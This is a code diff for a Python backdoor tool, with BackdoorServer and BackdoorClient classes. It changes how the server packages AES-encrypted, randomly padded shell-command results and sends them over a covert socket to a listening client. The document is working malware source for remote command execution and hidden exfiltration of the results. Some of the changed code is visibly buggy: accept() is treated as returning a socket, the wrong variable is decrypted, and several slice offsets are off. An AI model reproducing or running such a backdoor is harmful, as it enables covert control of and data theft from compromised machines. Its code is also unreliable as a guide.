@@ -22,6 +22,10 @@ URG = 0x20
 ECE = 0x40
 CWR = 0x80
 
+PACKET_SIZE = 1024 # Total payload size for result packets (including our application-level headers)
+FIRST_PACKET_PAYLOAD_MAX = PACKET_SIZE - 16 - 4 - 4 - 8
+OTHER_PACKET_PAYLOAD_MAX = PACKET_SIZE - 8
+
 def make_iv():
     """Creates a 16-byte initialisation vector for AES encryption using the current time."""
 
@@ -147,9 +151,6 @@ class BackdoorServer(object):
         # - 8 bytes: password
         # - remaining bytes: result bytes; if length of result is < 996, extra space is filled with random bytes
 
-        first_packet_payload_max = PACKET_SIZE - 16 - 4 - 4 - 8
-        other_packet_payload_max = PACKET_SIZE - 8
-
         iv = make_iv()
         encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
 
@@ -161,10 +162,10 @@ class BackdoorServer(object):
         payload = struct.pack("<I", start_padding)
         payload += struct.pack("<I", result_len)
         payload += self.password
-        payload += result_bytes[:min(len(result_bytes), first_packet_payload_max]
-        if result_len < first_packet_payload_max:
+        payload += result_bytes[:min(len(result_bytes), FIRST_PACKET_PAYLOAD_MAX]
+        if result_len < FIRST_PACKET_PAYLOAD_MAX:
             with open('/dev/random', 'r') as randfile:
-                remainder = first_packet_payload_max - result_len
+                remainder = FIRST_PACKET_PAYLOAD_MAX - result_len
                 payload += randfile.read(remainder)
 
         payload = encryptor.encrypt(payload)
@@ -173,24 +174,24 @@ class BackdoorServer(object):
         try:
             covert_sock.sendall(payload)
         except Exception, e:
-            print("Exception while transmitting result: {}".format(str(e))
+            print("Exception while transmitting result: {}".format(str(e)))
             covert_sock.shutdown(socket.SHUT_RDWR)
             return
 
-        if result_len > first_packet_payload_max:
-            offset = first_packet_payload_max
-            result_len -= first_packet_payload_max
+        if result_len > FIRST_PACKET_PAYLOAD_MAX:
+            offset = FIRST_PACKET_PAYLOAD_MAX
+            result_len -= FIRST_PACKET_PAYLOAD_MAX
             while result_len:
                 # Subsequent packets (if the result didn't fit in the first one):
                 # - 8 bytes: password
                 # - remaining bytes: result bytes + random bytes if remaining result len is < 1016 bytes
-                result_chunk_size = min(result_len, other_packet_payload_max)
+                result_chunk_size = min(result_len, OTHER_PACKET_PAYLOAD_MAX)
                 payload = self.password
                 payload += result_bytes[offset:result_chunk_size]
 
-                if result_chunk_size < other_packet_payload_max:
+                if result_chunk_size < OTHER_PACKET_PAYLOAD_MAX:
                     with open('/dev/random', 'r') as randfile:
-                        remainder = other_packet_payload_max - result_chunk_size
+                        remainder = OTHER_PACKET_PAYLOAD_MAX - result_chunk_size
                         payload += randfile.read(remainder)
 
                 try:
@@ -398,39 +399,90 @@ class BackdoorClient(object):
 
     def recv_result(self):
         """Receives the results of a command's execution from the server.
-        
+
         Returns a Result object containing the command's result.
         """
-        while True:
-            # TODO: Change this to use new logic described in BackdoorSever.send_result
-            raw = self.recv()
-            if len(raw) < 16:
-                continue
+        listen_timeout = 10
+        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listen_sock.setsockopt(socket.SO_REUSEADDR, 1)
+        listen_sock.settimeout(listen_timeout)
+        listen_sock.bind(('', self.lport))
+        listen_sock.listen(1)
+        try:
+            covert_sock = listen_sock.accept()
+        except Exception, e:
+            print("Error while listening for server connection: {}".format(str(e)))
+            return
 
-            iv = raw[0:16]
-            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)           
-            decrypted = decryptor.decrypt(raw[16:])
-            
-            if len(decrypted) < PASSWORD_LEN + 1: # password + command byte
-                continue
+        # First packet structure:
+        # - 16 bytes: initialisation vector
+        # - 4 bytes: random padding bytes for crypto alignment
+        # - 4 bytes: length of entire result (i.e. len(result.to_bytes()))
+        # - 8 bytes: password
+        # - remaining bytes: result bytes; if length of result is < 996, extra space is filled with random bytes
 
-            # We may have had to pad the payload for encryption; the size of the payload without
-            # padding is stored in the first 4 bytes
-            nopaddinglen = struct.unpack("<I", decrypted[0:4])[0]
-            start = 4
+        recv_timeout = 1
+        covert_sock.settimeout(recv_timeout)
+        try:
+            first_packet = covert_sock.recv(PACKET_SIZE, socket.MSG_WAITALL)
+        except Exception, e:
+            print("Error while receiving result: {}".format(str(e)))
+            return
 
-            if decrypted[start:start+PASSWORD_LEN] == self.password:
-                start += PASSWORD_LEN
-                resultbytes = decrypted[start:start+nopaddinglen]
-                resulttype = resultbytes[0] if isinstance(resultbytes[0], int) else ord(resultbytes[0])
+        iv = first_packet[0:16]
+        decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
+        offset = 16
 
-                if resulttype == command.Command.SHELL:
-                    return command.ShellCommand.Result.from_bytes(resultbytes)
-                elif resulttype == command.Command.WATCH:
-                    return command.WatchCommand.Result.from_bytes(resultbytes)
-                else:
-                    print("Unhandled result type {}".format(resulttype))
-                    sys.exit(1)
+        payload = decryptor.decrypt(first_packet[offset:])
+        offset += 4 # Skip the padding bytes
+
+        result_len = struct.unpack("<I", payload[offset:offset+4])[0]
+        offset += 4
+
+        password = payload[offset:offset+8]
+        offset += 8
+
+        # sanity check
+        if password != self.password:
+            print("Received bad result from server.")
+            return
+
+        if result_len <= FIRST_PACKET_PAYLOAD_MAX:
+            result_bytes = payload[offset:offset+result_len]
+        else:
+            result_bytes = payload[offset:]
+            result_len -= FIRST_PACKET_PAYLOAD_MAX
+
+            while result_len:
+                # Subsequent packets (if the result didn't fit in the first one):
+                # - 8 bytes: password
+                # - remaining bytes: result bytes + random bytes if remaining result len is < 1016 bytes
+                result_chunk_size = min(result_len, OTHER_PACKET_PAYLOAD_MAX)
+
+                try:
+                    packet = covert_sock.recv(PACKET_SIZE, socket.MSG_WAITALL)
+                except Exception, e:
+                    print("Error while receiving result: {}".format(str(e)))
+                    return
+
+                payload = decryptor.decrypt(payload)
+                if payload[0:8] != self.password:
+                    print("Received bad result from server.")
+                    return
+
+                result_bytes += payload[8:result_chunk_size]
+                result_len -= result_chunk_size
+
+        result_type = ord(result_bytes[0])
+
+        if result_type == command.Command.SHELL:
+            return command.ShellCommand.Result.from_bytes(result_bytes)
+        elif result_type == command.Command.WATCH:
+            return command.WatchCommand.Result.from_bytes(result_bytes)
+        else:
+            print("Unhandled result type {}".format(result_type))
+            sys.exit(1)
+
 
     def run(self):
         """Runs in a loop listening for the server and serving their requests."""
